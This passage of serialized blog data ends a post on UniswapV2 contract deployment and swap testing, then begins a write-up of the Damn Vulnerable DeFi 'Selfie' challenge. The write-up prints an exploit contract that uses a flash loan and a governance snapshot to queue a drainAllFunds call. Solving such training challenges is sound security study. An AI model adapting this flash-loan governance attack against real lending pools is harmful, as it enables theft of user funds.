<span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Swapper\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> UniswapV2Adapter <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"UniswapV2Adapter\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> swap <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> Swapper<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> uniswapV2Adapter <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> UniswapV2Adapter<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span>swap<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">await</span> swap<span class=\"token punctuation\">.</span><span class=\"token function\">deployed</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">console</span><span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Swap contract deployed at: </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>swap<span class=\"token punctuation\">.</span>address<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">await</span> uniswapV2Adapter<span class=\"token punctuation\">.</span><span class=\"token function\">deployed</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">console</span><span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>\n    <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">UniswapV2Adapter contract deployed at: </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>uniswapV2Adapter<span class=\"token punctuation\">.</span>address<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span>\n  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">const</span> adaptersRouters <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n    <span class=\"token punctuation\">{</span>\n      adapterAddress<span class=\"token operator\">:</span> uniswapV2Adapter<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span>\n      routers<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n        addresses<span class=\"token punctuation\">.</span>UniswapV2Router<span class=\"token punctuation\">,</span>\n        addresses<span class=\"token punctuation\">.</span>SushiSwapRouter<span class=\"token punctuation\">,</span>\n        addresses<span class=\"token punctuation\">.</span>ShibaSwapRouter<span class=\"token punctuation\">,</span>\n      <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> adaptersRouters<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">await</span> swap<span class=\"token punctuation\">.</span><span class=\"token function\">registerAdapter</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> adaptersRouters<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>adapterAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Register routers for adapters to use</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> adaptersRouters<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>routers<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token comment\">// console.log(`Index: ${j} - Address: ${adaptersRouters[i].routers[j]}`);</span>\n      <span class=\"token keyword\">await</span> uniswapV2Adapter<span class=\"token punctuation\">.</span><span class=\"token function\">registerRouter</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">,</span> adaptersRouters<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>routers<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token keyword\">return</span> <span class=\"token punctuation\">{</span>\n    DAIContract<span class=\"token punctuation\">,</span>\n    USDCContract<span class=\"token punctuation\">,</span>\n    WETHContractIWETH<span class=\"token punctuation\">,</span>\n    WETHContractIERC20<span class=\"token punctuation\">,</span>\n    utils<span class=\"token punctuation\">,</span>\n    swap<span class=\"token punctuation\">,</span>\n    uniswapV2Adapter<span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>Based on the contract that exists on each on-chain and the contract built on the off-chain, the instance is activated and the required method is called.</li>\n<li>The necessary part is to register each router with the adapter contract design pattern. At this time, by calling <code class=\"language-text\">registerRounter</code>, which was designed as a utility function in the Swap contract, registration is completed and distribution is completed.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\"><span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">multiSwapp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">const</span> chainId <span class=\"token operator\">=</span> ChainId<span class=\"token punctuation\">.</span><span class=\"token constant\">RINKEBY</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> <span class=\"token constant\">DAI</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Token</span><span class=\"token punctuation\">(</span>chainId<span class=\"token punctuation\">,</span> addresses<span class=\"token punctuation\">.</span><span class=\"token constant\">DAI</span><span class=\"token punctuation\">,</span> <span class=\"token number\">18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> <span class=\"token constant\">USDC</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Token</span><span class=\"token punctuation\">(</span>chainId<span class=\"token punctuation\">,</span> addresses<span class=\"token punctuation\">.</span><span class=\"token constant\">USDC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">const</span> <span class=\"token punctuation\">[</span>owner<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getSigners</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">console</span><span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Owner: </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>owner<span class=\"token punctuation\">.</span>address<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> amountIn <span class=\"token operator\">=</span> ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> slippageTolerance <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Percent</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"50\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"10000\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> pair <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> Fetcher<span class=\"token punctuation\">.</span><span class=\"token function\">fetchPairData</span><span class=\"token punctuation\">(</span><span class=\"token constant\">DAI</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">WETH</span><span class=\"token punctuation\">[</span><span class=\"token constant\">DAI</span><span class=\"token punctuation\">.</span>chainId<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> pair2 <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> Fetcher<span class=\"token punctuation\">.</span><span class=\"token function\">fetchPairData</span><span class=\"token punctuation\">(</span><span class=\"token constant\">DAI</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">USDC</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> route <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Route</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>pair<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">WETH</span><span class=\"token punctuation\">[</span><span class=\"token constant\">DAI</span><span class=\"token punctuation\">.</span>chainId<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> route2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Route</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>pair2<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">DAI</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> trade <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Trade</span><span class=\"token punctuation\">(</span>\n    route<span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">new</span> <span class=\"token class-name\">TokenAmount</span><span class=\"token punctuation\">(</span><span class=\"token constant\">WETH</span><span class=\"token punctuation\">[</span><span class=\"token constant\">DAI</span><span class=\"token punctuation\">.</span>chainId<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> amountIn<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    TradeType<span class=\"token punctuation\">.</span><span class=\"token constant\">EXACT_INPUT</span>\n  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> path <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>addresses<span class=\"token punctuation\">.</span><span class=\"token constant\">ETH</span><span class=\"token punctuation\">,</span> addresses<span class=\"token punctuation\">.</span><span class=\"token constant\">DAI</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> path2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>addresses<span class=\"token punctuation\">.</span><span class=\"token constant\">DAI</span><span class=\"token punctuation\">,</span> addresses<span class=\"token punctuation\">.</span><span class=\"token constant\">USDC</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> amountOutMin <span class=\"token operator\">=</span> trade<span class=\"token punctuation\">.</span><span class=\"token function\">minimumAmountOut</span><span class=\"token punctuation\">(</span>slippageTolerance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">;</span> <span class=\"token comment\">// needs to be converted to e.g. hex</span>\n  <span class=\"token keyword\">const</span> deadline <span class=\"token operator\">=</span> Math<span class=\"token punctuation\">.</span><span class=\"token function\">floor</span><span class=\"token punctuation\">(</span>Date<span class=\"token punctuation\">.</span><span class=\"token function\">now</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">60</span> <span class=\"token operator\">*</span> <span class=\"token number\">20</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 20 minutes from the current Unix time</span>\n\n  <span class=\"token keyword\">const</span> SwapperFactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Swapper\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> Swapper <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> SwapperFactory<span class=\"token punctuation\">.</span><span class=\"token function\">attach</span><span class=\"token punctuation\">(</span>addresses<span class=\"token punctuation\">.</span>SwapperContract<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">console</span><span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"approve Swapper transfer for init..\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> tx <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> Swapper<span class=\"token punctuation\">.</span><span class=\"token function\">multiSwapExactInput</span><span class=\"token punctuation\">(</span>\n    <span class=\"token punctuation\">{</span>\n      to<span class=\"token operator\">:</span> owner<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span>\n      amountIn<span class=\"token punctuation\">,</span>\n      srcToken<span class=\"token operator\">:</span> path<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n      destToken<span class=\"token operator\">:</span> path<span class=\"token punctuation\">[</span>path<span class=\"token punctuation\">.</span>length <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n      swaps<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">{</span>\n          routerId<span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n          adapterId<span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n          amountOut<span class=\"token operator\">:</span> amountOutMin<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n          deadline<span class=\"token punctuation\">,</span>\n          path<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>addresses<span class=\"token punctuation\">.</span><span class=\"token constant\">WETH</span><span class=\"token punctuation\">,</span> addresses<span class=\"token punctuation\">.</span><span class=\"token constant\">DAI</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n          percent<span class=\"token operator\">:</span> <span class=\"token number\">10000</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n      <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">{</span> value<span class=\"token operator\">:</span> amountIn <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">console</span><span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">MultiSwapExactInput tx: </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>tx<span class=\"token punctuation\">.</span>hash<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>Next, in the state of simple deployment, we plan to test the swapping function for each token with the test net and query the data of the event that occurred in SubGraph.</li>\n<li>Test the ETH↔DAI pair token through Uniswap Swapping.</li>\n<li>Finally, deployment and testing are completed.</li>\n</ul>\n<h3 id=\"uniswap-contract-code\" style=\"position:relative;\"><a href=\"#uniswap-contract-code\" aria-label=\"uniswap contract code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Uniswap Contract Code</h3>\n<ul>\n<li>Github RP:  <a href=\"https://github.com/dnsdudrla97/unswap-contract\">https://github.com/dnsdudrla97/unswap-contract</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#uniswap-code-level\">Uniswap Code Level</a></p>\n<ul>\n<li><a href=\"#two-models-of-exchange-way\">Two models of exchange way</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#uniswap-code-component\">Uniswap Code Component</a></p>\n<ul>\n<li><a href=\"#core-contract\">Core Contract</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#periphery-contract\">Periphery Contract</a></p>\n</li>\n<li>\n<p><a href=\"#core-contract-pair\">Core. Contract (Pair)</a></p>\n<ul>\n<li><a href=\"#contract-init--state-variable\">Contract Init &#x26;&#x26; State Variable</a></li>\n<li><a href=\"#vaults-managerment-features\">Vaults Managerment features</a></li>\n<li><a href=\"#how-to-store-tokens\">How to store tokens?</a></li>\n<li><a href=\"#mint--burn-features\">Mint , Burn Features</a></li>\n<li><a href=\"#contract-dependencies\">Contract Dependencies</a></li>\n<li><a href=\"#interface\">Interface</a></li>\n<li><a href=\"#interface-asset\">Interface Asset</a></li>\n<li><a href=\"#interface-uniswapv2pair\">Interface UniswapV2Pair</a></li>\n<li><a href=\"#interface-weth\">Interface WETH</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#swapper-contract-design\">Swapper Contract Design</a></p>\n<ul>\n<li><a href=\"#how-to-pricing-a-transaction\">How to Pricing a Transaction</a></li>\n<li><a href=\"#how-uniswap-handles-pricing\">How Uniswap Handles Pricing</a></li>\n<li><a href=\"#price-trading\">price trading</a></li>\n<li><a href=\"#state-variables\">State Variables</a></li>\n<li><a href=\"#functions\">Functions</a></li>\n<li><a href=\"#util-functions\">Util Functions</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#contract-testing---deploy-testnet\">Contract Testing  &#x26;&#x26; Deploy Testnet</a></p>\n<ul>\n<li><a href=\"#uniswap-contract-code\">Uniswap Contract Code</a></li>\n</ul>\n</li>\n</ul>\n</div>","excerpt":"Overview How it works at the uniswap code level uniswap code structure method uniswap contract Core Contract: Pair Core Contract: Factory Periphery Contract: Router Core Contract SingleTone Factory, consists of several pairs where Factory is responsible for creation and indexing. Contracts with a smaller surface area are easier to reason about, more prone to bugs, and functionally better. This means that many desired properties of the system can be asserted directly in code, leaving little room…","frontmatter":{"date":"August 03, 2022","title":"UniswapV2 Smart Contract","categories":"Blockchain","author":"Zer0Luck","emoji":"🦄"},"fields":{"slug":"/uniswap-contract/"}},"next":{"id":"89561d23-d132-589e-97d7-7094631e6016","html":"<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAACf0lEQVQoz1WRyWsTYQDFv9kySzqdZLJ2MpOZ78skk2mapKnpNOk0SdPW2KRt1HRxKV1c2lpKwXoQRRFBBC3ighcv3jx40YOoaEH0opcKriCCInoQPPoPiKT1Ivx4t987vAeuLo1N2X2CaLa44rzb5N2m4El4g2nRn/QFO0V/0u1rIvqTnkDa5UnErfrchduVxfNoaB5oIcPn1gmHhjtU3KFhVJhiUZuSDUiZMMopsKdNzgblbEi11EhOCmeT3SON1Yu7j182J04AbEsjGUixiGSgg0UUAykGEjRsccXlppNXI/kwzKGoraI8jNrJXN2qzuulA4BgEdnajjsigFIILgoIBVBqMzEJ4CFAyAAL4VSzneYiFIMwTCIZSLKIEwzQ3rt3avHs8OhSl90YaCwPjy0M1Bd2jh6tVKcL5Qm72KjUpjvSQyQDAWhjGM3KDJGMStCQbYmCcKoyMrlSKs92dI/1Vmft0kF711xPYdJoL8GoHVKtiFFweTs4PmpAq1Zd+fr2hwqLAJd4lwl8el+iMB5L1+RoUcnUJa0UT9UUlHd54gALAULBcBkAyS91f374dPP++1fP/qws3sJpjeZ04FJ7vWbFD8tCwBL0ik8uBmJlNdYflNK0U6dYRLERgtacYmrmyPr6pSc3r70+vXYnKPUASgHHZk+dXL0yPrImoX6POSzBcsAYVGMDghhneZ2gYXMeBjq4SEAupDv3lfrmrR1ToqfLyabBr+cffr/8/vHeu+WZc3JsUPBmWN5k+ZiDQxT7z9xm+0LemQ237k+5z+TEG2Dz7sa3x29+bnx5cP2RgUqAlElGI2iNYP4zya3nOSGWUA5N6i8OG5/2qBt/AShdfU2cIedjAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Selfie-contract\"\n        title=\"Selfie-contract\"\n        src=\"/static/9a5d43546788f9918cc85602449b35b6/37523/c6.png\"\n        srcset=\"/static/9a5d43546788f9918cc85602449b35b6/e9ff0/c6.png 180w,\n/static/9a5d43546788f9918cc85602449b35b6/f21e7/c6.png 360w,\n/static/9a5d43546788f9918cc85602449b35b6/37523/c6.png 720w,\n/static/9a5d43546788f9918cc85602449b35b6/e996b/c6.png 1050w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>Wargame Provider: @tinchoabbate</strong></p>\n<blockquote>\n<p>Challenge #6 — Selfie <br></p>\n</blockquote>\n<p>A new cool lending pool has launched! It’s now offering flash loans of DVT tokens.</p>\n<p>Wow, and it even includes a really fancy governance mechanism to control it.</p>\n<p>What could go wrong, right ?</p>\n<p>You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.</p>\n<ul>\n<li><a href=\"https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v2.1.0/contracts/selfie\">See the contracts</a></li>\n<li><a href=\"https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.1.0/test/selfie/selfie.challenge.js\">Complete the challenge</a></li>\n</ul>\n<h2 id=\"code-audit\" style=\"position:relative;\"><a href=\"#code-audit\" aria-label=\"code audit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Code Audit</h2>\n<blockquote>\n<p>SelfiePool.sol</p>\n</blockquote>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"../DamnValuableTokenSnapshot.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"./SimpleGovernance.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"./SelfiePool.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">SelfieExploit</span> <span class=\"token punctuation\">{</span>\n\n    SimpleGovernance <span class=\"token keyword\">public</span> governance<span class=\"token punctuation\">;</span>\n    SelfiePool <span class=\"token keyword\">public</span> pool<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> actionId<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> gvContract<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> poolContract<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        governance <span class=\"token operator\">=</span> <span class=\"token function\">SimpleGovernance</span><span class=\"token punctuation\">(</span>gvContract<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        pool <span class=\"token operator\">=</span> <span class=\"token function\">SelfiePool</span><span class=\"token punctuation\">(</span>poolContract<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    <span class=\"token punctuation\">}</span>\n\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">receiveTokens</span><span class=\"token punctuation\">(</span>DamnValuableTokenSnapshot token<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        token<span class=\"token punctuation\">.</span><span class=\"token function\">snapshot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        token<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        actionId <span class=\"token operator\">=</span> governance<span class=\"token punctuation\">.</span><span class=\"token function\">queueAction</span><span class=\"token punctuation\">(</span>\n                    <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>pool<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> \n                    abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span>\n                        <span class=\"token string\">\"drainAllFunds(address)\"</span><span class=\"token punctuation\">,</span>\n                        tx<span class=\"token punctuation\">.</span>origin\n                    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token number\">0</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> actionId<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_exploit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        pool<span class=\"token punctuation\">.</span><span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3 id=\"dependency\" style=\"position:relative;\"><a href=\"#dependency\" aria-label=\"dependency permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" 